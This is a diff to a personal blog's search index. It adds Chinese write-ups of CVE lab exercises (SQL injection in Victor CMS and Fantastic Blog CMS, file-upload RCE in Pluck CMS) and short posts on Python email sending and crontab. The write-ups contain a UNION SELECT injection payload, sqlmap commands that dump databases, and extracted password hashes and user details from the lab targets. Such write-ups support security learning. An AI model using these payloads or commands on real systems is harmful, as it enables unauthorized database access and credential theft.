@@ -4465,6 +4465,7 @@
 <p><img src="/images/image-20221010163915525.png" alt="image-20221010163915525"></p>
 <p>2、打开sqlmap运行python脚本获得flag</p>
 <p><img src="/images/image-20221010164312208.png" alt="image-20221010164312208"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --dbs --batch --random-agent -p eid</span><br></pre></td></tr></table></figure>
 <p><img src="/images/image-20221010164648886.png" alt="image-20221010164648886"></p>
 <p>3、查询ctf数据库中的表</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt -D ctf --tables --batch --random-agent -p eid</span><br></pre></td></tr></table></figure>
@@ -4576,6 +4577,172 @@
       </categories>
       <tags>
         <tag>任意文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-26201</title>
+    <url>/2022/10/14/CVE-2022-26201/</url>
+    <content><![CDATA[<!--toc-->
+<p>寒蝉凄切，对长亭晚，骤雨初歇。</p>
+<span id="more"></span>
+<h3 id="lou-dong-miao-shu"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述<a href="#lou-dong-miao-shu" class="header-anchor">#</a></h3><p>Victor CMS v1.0被发现存在SQl注入漏洞。</p>
+<h3 id="lou-dong-fen-xi"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析<a href="#lou-dong-fen-xi" class="header-anchor">#</a></h3><p>需要一些mysql中insert语句的知识。</p>
+<p><img src="/images/image-20221014110818481.png" alt="image-20221014110818481"></p>
+<p>该语句向test表的cat_tilte字段添加两行数据，分别是”33”和”22”。</p>
+<p><img src="/images/image-20221014111137235.png" alt="image-20221014111137235"></p>
+<p>知道以上知识就可以看懂POC了</p>
+<p><img src="/images/image-20221014111222912.png" alt="image-20221014111222912"></p>
+<p>$cat_title字段未过滤，直接括号、单引号闭合注入我们的数据即可</p>
+<p><img src="/images/image-20221014111456219.png" alt="image-20221014111456219"></p>
+<h3 id="lou-dong-li-yong"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用<a href="#lou-dong-li-yong" class="header-anchor">#</a></h3><p>春秋云镜：<a href="https://yunjing.ichunqiu.com/cve/detail/965?type=1&amp;pay=2">https://yunjing.ichunqiu.com/cve/detail/965?type=1&amp;pay=2</a></p>
+<h3 id="yin-yong"><a href="#引用" class="headerlink" title="引用"></a>引用<a href="#yin-yong" class="header-anchor">#</a></h3><p><a href="https://github.com/truonghuuphuc/CVE/blob/main/CVE-2022-26201.pdf">https://github.com/truonghuuphuc/CVE/blob/main/CVE-2022-26201.pdf</a></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>SQL注入-二次注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-26965</title>
+    <url>/2022/10/14/CVE-2022-26965/</url>
+    <content><![CDATA[<!--toc-->
+<h3 id="lou-dong-miao-shu"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述<a href="#lou-dong-miao-shu" class="header-anchor">#</a></h3><p>在Pluck 4.7.16中，一个admin用户可以使用位于/admin.php?action=themeinstall的主题上传功能造成远程代码执行。</p>
+<h3 id="lou-dong-li-yong"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用<a href="#lou-dong-li-yong" class="header-anchor">#</a></h3><p>春秋云镜：<a href="https://yunjing.ichunqiu.com/cve/detail/735?type=1&amp;pay=2">https://yunjing.ichunqiu.com/cve/detail/735?type=1&amp;pay=2</a></p>
+<p>直接使用现成的POC即可，注意将pluckcmspath改为空</p>
+<p><img src="/images/image-20221014103044666.png" alt="image-20221014103044666"></p>
+<p><img src="/images/image-20221014103100985.png" alt="image-20221014103100985"></p>
+<h3 id="yin-yong"><a href="#引用" class="headerlink" title="引用"></a>引用<a href="#yin-yong" class="header-anchor">#</a></h3><p><a href="https://packetstormsecurity.com/files/166336/Pluck-CMS-4.7.16-Shell-Upload.html">https://packetstormsecurity.com/files/166336/Pluck-CMS-4.7.16-Shell-Upload.html</a></p>
+<p><a href="https://github.com/shikari00007/Pluck-CMS-Pluck-4.7.16-Theme-Upload-Remote-Code-Execution-Authenticated--POC">https://github.com/shikari00007/Pluck-CMS-Pluck-4.7.16-Theme-Upload-Remote-Code-Execution-Authenticated--POC</a></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-28060</title>
+    <url>/2022/10/12/CVE-2022-28060/</url>
+    <content><![CDATA[<!--toc-->
+<p>多情自古伤离别，更那堪冷落清秋节。</p>
+<span id="more"></span>
+<h3 id="lou-dong-miao-shu"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述<a href="#lou-dong-miao-shu" class="header-anchor">#</a></h3><p>在 Victor CMS v1.0中存在SQL注入漏洞，具体漏洞点位于 /login.php的user_name参数。</p>
+<p><img src="../images/image-20221012153855236.png" alt="image-20221012153855236"></p>
+<h3 id="lou-dong-fen-xi"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析<a href="#lou-dong-fen-xi" class="header-anchor">#</a></h3><p>布尔盲注，根据user_name参数查询的真伪，页面会回显不同的值。</p>
+<p><img src="https://user-images.githubusercontent.com/57030243/159733060-9a3e70eb-2c17-448c-86c9-0ecb3b595057.png" alt="image"></p>
+<p><img src="https://user-images.githubusercontent.com/57030243/159733129-f714494d-5e8a-4a20-8d74-ae1b4f67969e.png" alt="image"></p>
+<h3 id="lou-dong-li-yong"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用<a href="#lou-dong-li-yong" class="header-anchor">#</a></h3><p>找到脚本，改一改就好啦，值得注意的是在请求之后最好等待2秒回复，否则脚本可能会注入失败。（后面发现2秒太慢了，我就去掉了时间限制然后一直请求直到成功回复）</p>
+<p>当前的数据库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_cms</span><br></pre></td></tr></table></figure>
+<p>当前数据库下的表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories,comments,posts,users</span><br></pre></td></tr></table></figure>
+<p><strong>categories</strong>的字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat_id,cat_title</span><br></pre></td></tr></table></figure>
+<p>comments表的字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comment_id,comment_post_id,comment_author,comment_email,comment_content,comment_status,comment_date</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>posts表的字段（注入到一半我换表了）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_id,post_category_id,post_title,post_author,post_date,post_image,post_content,post_tags,</span><br></pre></td></tr></table></figure>
+<p>users表的字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,user_id,user_name,user_firstname,user_lastname,user_password,user_email,user_image,user_role,randsalt</span><br></pre></td></tr></table></figure>
+<p>catalogries表的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1News,2Technology,3Tutorials,7Business,8Education</span><br></pre></td></tr></table></figure>
+<p>之后尝试对users表的用户id和用户密码进行猜解，但是这里的密码是进行了加盐的处理的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2,3$2y$10$6kFvYVJQEndRCVZbSCx6sOcp5E3oCnCK03oIY/0ZnJWjsjub2Z5g6,6$2y$10$VDH.FEM7qs5Yv29nnXuUqeoCWtYeVYJ6xKaGOZvoPzHBfCWtUXXr2</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20221013094611810.png" alt="image-20221013094611810"></p>
+<p><img src="../images/image-20221013094937075.png" alt="image-20221013094937075"></p>
+<p><img src="../images/image-20221013095206181.png" alt="image-20221013095206181"></p>
+<p><img src="../images/image-20221013100536337.png" alt="image-20221013100536337"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">,$2y$10$6kFvYVJQEndRCVZbSCx6sOcp5E3oCnCK03oIY/0ZnJWjsjub2Z5g6,$2y$10$VDH.FEM7qs5Yv29nnXuUqeoCWtYeVYJ6xKaGOZvoPzHBfCWtUXXr2,$2y$10$DCJGfBNgpoWml9.9/MYkaeSVUKf8t2tSUo5Po.bDfR3xcjx5pJwoa</span><br></pre></td></tr></table></figure>
+<p>comments表中的所有数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11Victor Alagwuvictor@gmail.com&lt;p&gt;Hello, each day of my life is a story&lt;/p&gt;approved2016-11-06,21JPjp@jp.com&lt;p&gt;Na so&lt;/p&gt;approved2016-12-14</span><br></pre></td></tr></table></figure>
+<p>users表中除了密码字段外的所有数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2ChuksJohnpaulAlagwuchuks@gmail.com2347033459561.jpgUserdgas,3DemoDemoSurname_Demodemo@gmail.comImageUserdgas,6HenryDemoLoadedHenryhenry@gmail.comImageAdmindgas,7VictorVictorAlagwuvictoralagwu@gmail.comIMG_20160129_145808.jpgAdmindgas</span><br></pre></td></tr></table></figure>
+<p>查到一个用户的密码以及盐值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Demo-$2y$10$6kFvYVJQEndRCVZbSCx6sOcp5E3oCnCK03oIY/0ZnJWjsjub2Z5g6-dgas</span><br></pre></td></tr></table></figure>
+<h3 id="zong-jie"><a href="#总结" class="headerlink" title="总结"></a>总结<a href="#zong-jie" class="header-anchor">#</a></h3><p>一次常规的布尔盲注。</p>
+<h3 id="yin-yong"><a href="#引用" class="headerlink" title="引用"></a>引用<a href="#yin-yong" class="header-anchor">#</a></h3><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-28060">https://nvd.nist.gov/vuln/detail/CVE-2022-28060</a></p>
+<p><a href="https://github.com/JiuBanSec/CVE/blob/main/VictorCMS%20SQL.md">https://github.com/JiuBanSec/CVE/blob/main/VictorCMS%20SQL.md</a></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python自动发邮箱</title>
+    <url>/2022/10/14/python%E8%87%AA%E5%8A%A8%E5%8F%91%E9%82%AE%E7%AE%B1/</url>
+    <content><![CDATA[<!--toc-->
+<p>工作需求要实现一个自动发送邮箱的功能</p>
+<span id="more"></span>
+<p>在我搜寻一圈后，发现网上很多已有现成的版本。但是他们用的都是普通的网易邮箱，所以我需要找到企业网易邮箱的服务器域名。</p>
+<p><img src="../images/image-20221014163312929.png" alt="image-20221014163312929"></p>
+<p>受到<a href="http://www.dns110.com/docs/13515.html">上图</a>的启发，我发现企业版的smtp服务器地址是smtp.qiye.163.com</p>
+<p>之后按照下图步骤配置好相关的事物</p>
+<p>1、<img src="../images/image-20221014163516682.png" alt="image-20221014163516682"></p>
+<p>2、</p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>自动发送邮箱</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-28512</title>
+    <url>/2022/10/11/CVE-2022-28512/</url>
+    <content><![CDATA[<!--toc-->
+<p>晓镜但愁云鬓改，夜吟应觉月光寒。</p>
+<span id="more"></span>
+<h3 id="lou-dong-miao-shu"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述<a href="#lou-dong-miao-shu" class="header-anchor">#</a></h3><p>在Sourcecodester Fantastic Blog CMS 1.0中存在一个SQL注入漏洞。攻击者可以通过<code>id=5</code>参数在<code>/fantasticblog/single.php</code>注入查询。</p>
+<h3 id="lou-dong-fen-xi"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析<a href="#lou-dong-fen-xi" class="header-anchor">#</a></h3><p><img src="https://user-images.githubusercontent.com/57030243/160570899-903e2efc-1df8-4d56-ad23-23378d4c98f2.png" alt="image"></p>
+<p>id参数未过滤直接带入查询。输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,database(),3,user(),5,6,7,8,9--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://user-images.githubusercontent.com/57030243/160573362-bdb4011a-b3c8-4621-868e-30469ba9acec.png" alt="image"></p>
+<h3 id="lou-dong-li-yong"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用<a href="#lou-dong-li-yong" class="header-anchor">#</a></h3><p>地址：<a href="https://yunjing.ichunqiu.com/cve/detail/749?type=1&amp;pay=2">https://yunjing.ichunqiu.com/cve/detail/749?type=1&amp;pay=2</a></p>
+<p>SQLMAP一把梭！！！漏洞点在：<a href="http://eci-2ze5kq310ps6xjbm6ayu.cloudeci1.ichunqiu.com/single.php?id=%27%20union%20select%201,database(),3,user(),5,6,7,8,9--+-">http://eci-2ze5kq310ps6xjbm6ayu.cloudeci1.ichunqiu.com/single.php?id=%27%20union%20select%201,database(),3,user(),5,6,7,8,9--+-</a></p>
+<p>是的，在/single.php下。</p>
+<p><img src="/images/image-20221011143339898.png" alt="image-20221011143339898"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt -p id --dbs</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt -p id -D ctf --tables</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt -p id -D ctf -T flag --columns</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt -p id -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+<h3 id="zong-jie"><a href="#总结" class="headerlink" title="总结"></a>总结<a href="#zong-jie" class="header-anchor">#</a></h3><p>又熟悉了一遍sqlmap操作。</p>
+<h3 id="yin-yong"><a href="#引用" class="headerlink" title="引用"></a>引用<a href="#yin-yong" class="header-anchor">#</a></h3><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-28512">NVD - CVE-2022-28512 (nist.gov)</a></p>
+<p><a href="https://github.com/JiuBanSec/CVE/blob/main/Fantastic Blog CMS/SQL1.md">CVE/SQL1.md at main · JiuBanSec/CVE (github.com)</a></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali下的定时任务</title>
+    <url>/2022/10/14/kali%E4%B8%8B%E7%9A%84%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
+    <content><![CDATA[<!--toc-->
+<p>今天工作要求是写一个每日自动执行python脚本并自动发送邮箱的代码出来。于是乎很自然地想到了kali或者说是linux下的crontab命令。</p>
+<span id="more"></span>
+<h3 id="wen-ti-shuo-ming"><a href="#问题说明" class="headerlink" title="问题说明"></a>问题说明<a href="#wen-ti-shuo-ming" class="header-anchor">#</a></h3><p>crontab的使用很简单，经过一番百度我就书写完了我的定时任务，但是一直无法执行</p>
+<p>一开始的命令是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* * * * * python3 /home/kali/Desktop/test.py</span><br></pre></td></tr></table></figure>
+<p>后面观察到需要先cd到执行脚本的目录下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* * * * * <span class="built_in">cd</span> /home/kali/Desktop;python3 test.py</span><br></pre></td></tr></table></figure>
+<h3 id="yin-yong-lian-jie"><a href="#引用链接" class="headerlink" title="引用链接"></a>引用链接<a href="#yin-yong-lian-jie" class="header-anchor">#</a></h3><p><a href="https://www.cnblogs.com/Hi-blog/p/Schedule-Tasks-On-Linux-And-Windows.html">https://www.cnblogs.com/Hi-blog/p/Schedule-Tasks-On-Linux-And-Windows.html</a></p>
+<p><a href="https://bbskali.cn/thread-2157-1-1.html">https://bbskali.cn/thread-2157-1-1.html</a></p>
+<p><a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></p>
+]]></content>
+      <categories>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>定时任务</tag>
       </tags>
   </entry>
 </search>
